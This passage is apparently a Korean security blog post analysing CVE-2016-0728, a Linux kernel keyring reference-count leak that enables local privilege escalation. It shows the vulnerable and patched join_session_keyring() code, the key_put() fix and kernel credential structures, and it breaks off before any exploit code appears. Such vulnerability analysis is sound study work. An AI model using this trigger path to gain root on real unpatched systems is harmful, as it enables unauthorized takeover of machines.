&lt;h1 id=&quot;information&quot;&gt;&lt;a href=&quot;#information&quot; class=&quot;headerlink&quot; title=&quot;information&quot;&gt;&lt;/a&gt;information&lt;/h1&gt;&lt;p&gt;&lt;img src=&quot;https://user-images.githubusercontent.com/70257118/95414395-c453b100-0968-11eb-82dd-79b6e5e9e596.png&quot; alt=&quot;제목 없음&quot;&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;2016년,리눅스 커널에서 LPE(Local Privilege Escalation)취약점이 발견되었다.&lt;/li&gt;
&lt;li&gt;이 취약점은 2012년부터 존재했지만 2016년이 되어서야  취약점이 발견되었다.&lt;/li&gt;
&lt;li&gt;당시 수천만대의 Linux 개인 PC와 Server, 66%의 Android device(kit-kat)에 영향을 주었다.&lt;/li&gt;
&lt;li&gt;취약점은 32bit,64bit상관없이 발생하며, 4.4.1 버전 이전의 모든 리눅스 커널에서 발생한다.</description>
      
      
      
      <content:encoded><![CDATA[<center>CVE-2016-0728 // Linux Kernel 1-day </center><h1 id="information"><a href="#information" class="headerlink" title="information"></a>information</h1><p><img src="https://user-images.githubusercontent.com/70257118/95414395-c453b100-0968-11eb-82dd-79b6e5e9e596.png" alt="제목 없음"></p><ul><li>2016년,리눅스 커널에서 LPE(Local Privilege Escalation)취약점이 발견되었다.</li><li>이 취약점은 2012년부터 존재했지만 2016년이 되어서야  취약점이 발견되었다.</li><li>당시 수천만대의 Linux 개인 PC와 Server, 66%의 Android device(kit-kat)에 영향을 주었다.</li><li>취약점은 32bit,64bit상관없이 발생하며, 4.4.1 버전 이전의 모든 리눅스 커널에서 발생한다.<span id="more"></span><img src="https://user-images.githubusercontent.com/70257118/95419567-d4718d80-0974-11eb-97dc-8b0e95991573.png" alt="1"></li><li>취약점이 발생하는 환경은 다음과 같으며,  ubuntu 14.04 LTS 환경에서 증명해 보겠다.</li></ul><h1 id="Vulnerability"><a href="#Vulnerability" class="headerlink" title="Vulnerability"></a>Vulnerability</h1><h3 id="Integer-Overflow-trigger"><a href="#Integer-Overflow-trigger" class="headerlink" title="- Integer Overflow (trigger)"></a>- Integer Overflow (trigger)</h3><h3 id="Use-after-free-exploit"><a href="#Use-after-free-exploit" class="headerlink" title="- Use after free (exploit)"></a>- Use after free (exploit)</h3><ul><li>Integer Overflow 취약점이 존재하는 부분은 <code>keyctl</code>이라는 커맨드이다.</li><li><code>keyctl</code>은 리눅스의 <code>key</code>를 보유 및 관리하는 시스템이다.</li><li>keyring은 다른 key(다른 keyring을 포함할 수 있음)에 대한 링크가 포함된 특별한 유형의 key다.</li></ul><p><img src="https://user-images.githubusercontent.com/70257118/95422776-e48c6b80-097a-11eb-8eb9-d4f58ca5955e.png" alt="2"></p><ul><li>key는 암호 데이터, 인증 토큰에 대한 구조체이며 아래와 같다.</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">key</span> &#123;</span></span><br><span class="line">      <span class="keyword">atomic_t</span>                 usage;       <span class="comment">/* number of references */</span></span><br><span class="line">      <span class="keyword">key_serial_t</span>           serial;        <span class="comment">/* key serial number */</span></span><br><span class="line">      <span class="class"><span class="keyword">struct</span> <span class="title">key_type</span>      *<span class="title">type</span>;</span>        <span class="comment">/* type of key */</span></span><br><span class="line">      <span class="keyword">time_t</span>                     expiry;  <span class="comment">/* time at which key expires (or 0) */</span></span><br><span class="line">      <span class="keyword">uid_t</span>                       uid;           <span class="comment">/* UID */</span></span><br><span class="line">      <span class="keyword">gid_t</span>                       gid;           <span class="comment">/* GID */</span></span><br><span class="line">      <span class="keyword">key_perm_t</span>            perm;        <span class="comment">/* access permissions */</span></span><br><span class="line">      <span class="keyword">unsigned</span> <span class="keyword">short</span>       quotalen;   <span class="comment">/* length added to quota */</span></span><br><span class="line">      <span class="keyword">unsigned</span> <span class="keyword">short</span>       datalen;     <span class="comment">/* payload data length</span></span><br><span class="line"><span class="comment">      char                      *description;</span></span><br><span class="line"><span class="comment">      union &#123;</span></span><br><span class="line"><span class="comment">          unsigned long             value;</span></span><br><span class="line"><span class="comment">          void                            *data;</span></span><br><span class="line"><span class="comment">          struct keyring_list       *subscriptions;</span></span><br><span class="line"><span class="comment">      &#125; payload;                                 /* Actual security data */</span></span><br><span class="line">      ....</span><br><span class="line">      ....</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p><img src="https://user-images.githubusercontent.com/70257118/98777101-80eed580-2433-11eb-8d64-248ab5469aa7.png" alt="1"></p><ul><li><p>해당 취약점에서 중요한 변수는 <code>key-&gt;usage</code>이다.</p></li><li><p><strong>key-&gt;usage의 type은 atomic_t형으로 이는 int형과 같다.</strong></p></li><li><p>취약점이 발생하는 함수는 <code>join_session_keyring</code>이다.</p></li></ul><p><img src="https://user-images.githubusercontent.com/70257118/95425267-fa039480-097e-11eb-87b5-4820e5629540.png" alt="55"></p><ul><li><p>keyctl(KEYCTL_JOIN_SESSION_KEYRING, name)을 이용하여 현재의 세션에서 새로운 keyring을 생성할 수 있다.</p></li><li><p>name이 NULL일 경우 익명, NULL 이 아닐경우 해당 keyring에 이름을 지정할 수 있다.</p></li><li><p>keyring은 같은 이름의 keyring을 참조하여 서로 다른 프로세스에서 공유할 수 있다.</p></li><li><p>만약 하나의 keyring이 여러 프로세스에서 공유되고 있다면 usage라는 필드에 위치한 객체의 내부 reference count가 계속해서 증가하게 된다.</p></li></ul><h2 id="source-code-before-the-vulnerability-is-patched"><a href="#source-code-before-the-vulnerability-is-patched" class="headerlink" title="source code, before the vulnerability is patched"></a>source code, before the vulnerability is patched</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">long</span> <span class="title">join_session_keyring</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *name)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">cred</span> *<span class="title">old</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">cred</span> *<span class="title">new</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">key</span> *<span class="title">keyring</span>;</span></span><br><span class="line"><span class="keyword">long</span> ret, serial;</span><br><span class="line"></span><br><span class="line"><span class="keyword">new</span> = prepare_creds();</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">new</span>)</span><br><span class="line"><span class="keyword">return</span> -ENOMEM;</span><br><span class="line">old = current_cred();</span><br><span class="line"></span><br><span class="line"><span class="comment">/* if no name is provided, install an anonymous keyring */</span></span><br><span class="line"><span class="keyword">if</span> (!name) &#123;</span><br><span class="line">ret = install_session_keyring_to_cred(<span class="keyword">new</span>, <span class="literal">NULL</span>);</span><br><span class="line"><span class="keyword">if</span> (ret &lt; <span class="number">0</span>)</span><br><span class="line"><span class="keyword">goto</span> error;</span><br><span class="line"></span><br><span class="line">serial = <span class="keyword">new</span>-&gt;session_keyring-&gt;serial;</span><br><span class="line">ret = commit_creds(<span class="keyword">new</span>);</span><br><span class="line"><span class="keyword">if</span> (ret == <span class="number">0</span>)</span><br><span class="line">ret = serial;</span><br><span class="line"><span class="keyword">goto</span> okay;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* allow the user to join or create a named keyring */</span></span><br><span class="line">mutex_lock(&amp;key_session_mutex);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* look for an existing keyring of this name */</span></span><br><span class="line">keyring = find_keyring_by_name(name, <span class="literal">false</span>); <span class="comment">// find_keyring_by_name increments keyring usage if a keyring was found</span></span><br><span class="line">    </span><br><span class="line"><span class="keyword">if</span> (PTR_ERR(keyring) == -ENOKEY) &#123;</span><br><span class="line"><span class="comment">/* not found - try and create a new one */</span></span><br><span class="line">keyring = keyring_alloc(</span><br><span class="line">name, old-&gt;uid, old-&gt;gid, old,</span><br><span class="line">KEY_POS_ALL | KEY_USR_VIEW | KEY_USR_READ | KEY_USR_LINK,</span><br><span class="line">KEY_ALLOC_IN_QUOTA, <span class="literal">NULL</span>);</span><br><span class="line"><span class="keyword">if</span> (IS_ERR(keyring)) &#123;</span><br><span class="line">ret = PTR_ERR(keyring);</span><br><span class="line"><span class="keyword">goto</span> error2;</span><br><span class="line">&#125;</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (IS_ERR(keyring)) &#123; </span><br><span class="line">ret = PTR_ERR(keyring);</span><br><span class="line"><span class="keyword">goto</span> error2; </span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (keyring == <span class="keyword">new</span>-&gt;session_keyring) &#123;</span><br><span class="line">ret = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">goto</span> error2;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* we&#x27;ve got a keyring - now to install it */</span></span><br><span class="line">ret = install_session_keyring_to_cred(<span class="keyword">new</span>, keyring);</span><br><span class="line"><span class="keyword">if</span> (ret &lt; <span class="number">0</span>)</span><br><span class="line"><span class="keyword">goto</span> error2;</span><br><span class="line"></span><br><span class="line">commit_creds(<span class="keyword">new</span>);</span><br><span class="line">mutex_unlock(&amp;key_session_mutex); </span><br><span class="line"></span><br><span class="line">ret = keyring-&gt;serial; </span><br><span class="line">key_put(keyring); </span><br><span class="line">okay:</span><br><span class="line"><span class="keyword">return</span> ret;</span><br><span class="line"></span><br><span class="line">error2:</span><br><span class="line">mutex_unlock(&amp;key_session_mutex);</span><br><span class="line">error:</span><br><span class="line">abort_creds(<span class="keyword">new</span>);</span><br><span class="line"><span class="keyword">return</span> ret; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="source-code-after-the-vulnerability-is-patched"><a href="#source-code-after-the-vulnerability-is-patched" class="headerlink" title="source code, after the vulnerability is patched"></a>source code, after the vulnerability is patched</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">long</span> <span class="title">join_session_keyring</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *name)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">cred</span> *<span class="title">old</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">cred</span> *<span class="title">new</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">key</span> *<span class="title">keyring</span>;</span></span><br><span class="line"><span class="keyword">long</span> ret, serial;</span><br><span class="line"></span><br><span class="line"><span class="keyword">new</span> = prepare_creds();</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">new</span>)</span><br><span class="line"><span class="keyword">return</span> -ENOMEM;</span><br><span class="line">old = current_cred();</span><br><span class="line"></span><br><span class="line"><span class="comment">/* if no name is provided, install an anonymous keyring */</span></span><br><span class="line"><span class="keyword">if</span> (!name) &#123;</span><br><span class="line">ret = install_session_keyring_to_cred(<span class="keyword">new</span>, <span class="literal">NULL</span>);</span><br><span class="line"><span class="keyword">if</span> (ret &lt; <span class="number">0</span>)</span><br><span class="line"><span class="keyword">goto</span> error;</span><br><span class="line"></span><br><span class="line">serial = <span class="keyword">new</span>-&gt;session_keyring-&gt;serial;</span><br><span class="line">ret = commit_creds(<span class="keyword">new</span>);</span><br><span class="line"><span class="keyword">if</span> (ret == <span class="number">0</span>)</span><br><span class="line">ret = serial;</span><br><span class="line"><span class="keyword">goto</span> okay;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* allow the user to join or create a named keyring */</span></span><br><span class="line">mutex_lock(&amp;key_session_mutex);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* look for an existing keyring of this name */</span></span><br><span class="line">keyring = find_keyring_by_name(name, <span class="literal">false</span>);</span><br><span class="line"><span class="keyword">if</span> (PTR_ERR(keyring) == -ENOKEY) &#123;</span><br><span class="line"><span class="comment">/* not found - try and create a new one */</span></span><br><span class="line">keyring = keyring_alloc(</span><br><span class="line">name, old-&gt;uid, old-&gt;gid, old,</span><br><span class="line">KEY_POS_ALL | KEY_USR_VIEW | KEY_USR_READ | KEY_USR_LINK,</span><br><span class="line">KEY_ALLOC_IN_QUOTA, <span class="literal">NULL</span>);</span><br><span class="line"><span class="keyword">if</span> (IS_ERR(keyring)) &#123;</span><br><span class="line">ret = PTR_ERR(keyring);</span><br><span class="line"><span class="keyword">goto</span> error2;</span><br><span class="line">&#125;</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (IS_ERR(keyring)) &#123;</span><br><span class="line">ret = PTR_ERR(keyring);</span><br><span class="line"><span class="keyword">goto</span> error2;</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (keyring == <span class="keyword">new</span>-&gt;session_keyring) &#123;</span><br><span class="line">key_put(keyring);</span><br><span class="line">ret = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">goto</span> error2;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* we&#x27;ve got a keyring - now to install it */</span></span><br><span class="line">ret = install_session_keyring_to_cred(<span class="keyword">new</span>, keyring);</span><br><span class="line"><span class="keyword">if</span> (ret &lt; <span class="number">0</span>)</span><br><span class="line"><span class="keyword">goto</span> error2;</span><br><span class="line"></span><br><span class="line">commit_creds(<span class="keyword">new</span>);</span><br><span class="line">mutex_unlock(&amp;key_session_mutex);</span><br><span class="line"></span><br><span class="line">ret = keyring-&gt;serial;</span><br><span class="line">key_put(keyring);</span><br><span class="line">okay:</span><br><span class="line"><span class="keyword">return</span> ret;</span><br><span class="line"></span><br><span class="line">error2:</span><br><span class="line">mutex_unlock(&amp;key_session_mutex);</span><br><span class="line">error:</span><br><span class="line">abort_creds(<span class="keyword">new</span>);</span><br><span class="line"><span class="keyword">return</span> ret; </span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><h2 id="the-difference-between-these-code"><a href="#the-difference-between-these-code" class="headerlink" title="the difference between these code"></a>the difference between these code</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//Before</span></span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (keyring == <span class="keyword">new</span>-&gt;session_keyring) &#123;</span><br><span class="line">ret = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">goto</span> error2;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//After</span></span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (keyring == <span class="keyword">new</span>-&gt;session_keyring) &#123;</span><br><span class="line">key_put(keyring); <span class="comment">//patched</span></span><br><span class="line">ret = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">goto</span> error2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>패치된 코드를 보면, else if 문에서 goto error2이전에 key_put(keyring)이라는 코드가 추가되었다.<h3 id="key-put"><a href="#key-put" class="headerlink" title="key_put()"></a>key_put()</h3></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">key_put</span><span class="params">(struct key *key)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span> (key) &#123;</span><br><span class="line">key_check(key);</span><br><span class="line"><span class="keyword">if</span> (refcount_dec_and_test(&amp;key-&gt;usage))</span><br><span class="line">schedule_work(&amp;key_gc_work);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">EXPORT_SYMBOL(key_put);</span><br></pre></td></tr></table></figure><ul><li><p>key_put 함수는 해당 keyring의 usage (<code>reference count</code>) 를 감소시키는 역할을 한다.</p></li><li><p>추가적으로 <code>reference count</code>가 0이 되어 더이상 사용되지 않는 메모리가 된다면, 해당 포인터를 리눅스의 Garbage Colllector가 free 시킨다.</p></li></ul><h1 id="source-code-analysis"><a href="#source-code-analysis" class="headerlink" title="source code analysis"></a>source code analysis</h1><ul><li>join_session_keyring 함수를 크게 세 부분으로 나눠서 분석하겠다.<h2 id="part-1-cred-구조체-초기화"><a href="#part-1-cred-구조체-초기화" class="headerlink" title="part 1 : cred 구조체 초기화"></a>part 1 : cred 구조체 초기화</h2></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">long</span> <span class="title">join_session_keyring</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *name)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">cred</span> *<span class="title">old</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">cred</span> *<span class="title">new</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">key</span> *<span class="title">keyring</span>;</span></span><br><span class="line"><span class="keyword">long</span> ret, serial;</span><br><span class="line"></span><br><span class="line"><span class="keyword">new</span> = prepare_creds();</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">new</span>)</span><br><span class="line"><span class="keyword">return</span> -ENOMEM;</span><br><span class="line">old = current_cred();</span><br></pre></td></tr></table></figure><ul><li>join_session_keyring 함수가 호출되면 prepare_creds()함수를 통해 수정용 cred 구조체 new를 초기화 해준다.</li><li>current_cred()를 통해 현재 작업의 subjective credentials를 액세스 한다.</li></ul><h3 id="prepare-creds"><a href="#prepare-creds" class="headerlink" title="prepare_creds()"></a>prepare_creds()</h3><p><img src="https://user-images.githubusercontent.com/70257118/98334793-07c43c80-2047-11eb-98a0-adaaee9c304d.png" alt="제목 없음"></p><ul><li>Task의 creds는 직접적으로 수정할 수 없어 반드시 copy 후 수정해야 한다.</li><li>prepare_creds()를 호출하여 copy를 준비 한다. (new = prepare_creds())</li><li>수정 후 commit_creds()를 호출하여 커밋한다. (commit_creds(new))</li></ul> <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">struct cred *<span class="title">prepare_creds</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">task_struct</span> *<span class="title">task</span> =</span> current;</span><br><span class="line"><span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">cred</span> *<span class="title">old</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">cred</span> *<span class="title">new</span>;</span></span><br><span class="line">validate_process_creds();</span><br><span class="line"><span class="keyword">new</span> = kmem_cache_alloc(cred_jar, GFP_KERNEL);</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">new</span>)</span><br><span class="line"><span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">kdebug(<span class="string">&quot;prepare_creds() alloc %p&quot;</span>, <span class="keyword">new</span>);</span><br><span class="line">old = task-&gt;cred;</span><br><span class="line"><span class="built_in">memcpy</span>(<span class="keyword">new</span>, old, <span class="keyword">sizeof</span>(struct cred));</span><br><span class="line">atomic_set(&amp;<span class="keyword">new</span>-&gt;usage, <span class="number">1</span>);</span><br><span class="line">set_cred_subscribers(<span class="keyword">new</span>, <span class="number">0</span>);</span><br><span class="line">get_group_info(<span class="keyword">new</span>-&gt;group_info);</span><br><span class="line">get_uid(<span class="keyword">new</span>-&gt;user);</span><br><span class="line">get_user_ns(<span class="keyword">new</span>-&gt;user_ns);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_KEYS</span></span><br><span class="line">key_get(<span class="keyword">new</span>-&gt;session_keyring); </span><br><span class="line">key_get(<span class="keyword">new</span>-&gt;process_keyring);</span><br><span class="line">key_get(<span class="keyword">new</span>-&gt;thread_keyring);</span><br><span class="line">key_get(<span class="keyword">new</span>-&gt;request_key_auth);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_SECURITY</span></span><br><span class="line"><span class="keyword">new</span>-&gt;security = <span class="literal">NULL</span>;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="keyword">if</span> (security_prepare_creds(<span class="keyword">new</span>, old, GFP_KERNEL) &lt; <span class="number">0</span>)</span><br><span class="line"><span class="keyword">goto</span> error;</span><br><span class="line">validate_creds(<span class="keyword">new</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">new</span>;</span><br><span class="line">error:</span><br><span class="line">abort_creds(<span class="keyword">new</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li> 수정용 cred 구조체를 만들어 return 해준다.</li></ul><h3 id="what-is-struct-cred"><a href="#what-is-struct-cred" class="headerlink" title="what is struct cred?"></a>what is struct cred?</h3><p><img src="https://user-images.githubusercontent.com/70257118/98340730-2cbdad00-2051-11eb-8409-1ff1950ac625.png" alt="1"></p><ul><li>Credentials : 자격증명</li><li>Linux에서는 다음과 같은 Credentials들을 <code>struct cred</code>를 통해 관리한다.<br>  Traditional UNIX credentials.<br>  Capabilities.<br>  Secure management flags (securebits).<br>  Keys and keyrings.<br>  LSM<br>  AF_KEY </li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">cred</span> &#123;</span></span><br><span class="line"><span class="keyword">atomic_t</span>usage;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_DEBUG_CREDENTIALS</span></span><br><span class="line"><span class="keyword">atomic_t</span>subscribers;<span class="comment">/* number of processes subscribed */</span></span><br><span class="line"><span class="keyword">void</span>*put_addr;</span><br><span class="line"><span class="keyword">unsigned</span>magic;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CRED_MAGIC0x43736564</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CRED_MAGIC_DEAD0x44656144</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="keyword">kuid_t</span>uid;<span class="comment">/* real UID of the task */</span></span><br><span class="line"><span class="keyword">kgid_t</span>gid;<span class="comment">/* real GID of the task */</span></span><br><span class="line"><span class="keyword">kuid_t</span>suid;<span class="comment">/* saved UID of the task */</span></span><br><span class="line"><span class="keyword">kgid_t</span>sgid;<span class="comment">/* saved GID of the task */</span></span><br><span class="line"><span class="keyword">kuid_t</span>euid;<span class="comment">/* effective UID of the task */</span></span><br><span class="line"><span class="keyword">kgid_t</span>egid;<span class="comment">/* effective GID of the task */</span></span><br><span class="line"><span class="keyword">kuid_t</span>fsuid;<span class="comment">/* UID for VFS ops */</span></span><br><span class="line"><span class="keyword">kgid_t</span>fsgid;<span class="comment">/* GID for VFS ops */</span></span><br><span class="line"><span class="keyword">unsigned</span>securebits;<span class="comment">/* SUID-less security management */</span></span><br><span class="line"><span class="keyword">kernel_cap_t</span>cap_inheritable; <span class="comment">/* caps our children can inherit */</span></span><br><span class="line"><span class="keyword">kernel_cap_t</span>cap_permitted;<span class="comment">/* caps we&#x27;re permitted */</span></span><br><span class="line"><span class="keyword">kernel_cap_t</span>cap_effective;<span class="comment">/* caps we can actually use */</span></span><br><span class="line"><span class="keyword">kernel_cap_t</span>cap_bset;<span class="comment">/* capability bounding set */</span></span><br><span class="line"><span class="keyword">kernel_cap_t</span>cap_ambient;<span class="comment">/* Ambient capability set */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_KEYS</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span>jit_keyring;<span class="comment">/* default keyring to attach requested</span></span><br><span class="line"><span class="comment"> * keys to */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">key</span> __<span class="title">rcu</span> *<span class="title">session_keyring</span>;</span> <span class="comment">/* keyring inherited over fork 